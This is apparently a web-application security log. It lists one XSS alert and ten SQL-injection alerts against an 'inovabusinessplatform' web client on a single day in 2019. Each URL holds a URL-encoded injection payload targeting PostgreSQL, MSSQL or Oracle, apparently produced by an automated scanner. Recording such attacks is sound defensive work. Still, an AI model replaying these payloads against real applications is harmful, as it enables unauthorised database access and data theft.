XSS_INJECTION->LOW | 2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27ITTbgM%3C%27%22%3EoMnMZv
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27DAry%27%3D%27DAry
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27uLop%27%3D%27uLop
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20zfzG
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%284431%3D4431
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%28%27AepW%27%3D%27AepW
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%27wuFA%27%3D%27wuFA
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20wiSX
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%208580%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288580%3D8580%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%289064%3D9064
